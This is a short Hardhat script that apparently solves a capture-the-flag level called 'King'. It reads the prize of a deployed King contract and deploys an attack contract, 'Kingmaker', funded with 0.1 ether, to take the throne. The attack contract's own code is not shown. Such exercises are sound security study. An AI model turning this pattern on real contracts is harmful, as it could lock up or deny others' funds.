import { ethers } from "hardhat";

async function main() {
    const King = await ethers.getContractFactory('King')
    const king = await King.attach("0x6FC39B464D04C0f9215b6C76d05Ca7Bb6646f0A3")

    let prize = await king.prize()
    console.log("Current Prize is:", ethers.utils.formatEther(prize))

    const attack = await ethers.getContractFactory('Kingmaker')
    await attack.deploy(king.address, {value: ethers.utils.parseEther('0.1')})

    console.log("King:", await king._king())
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
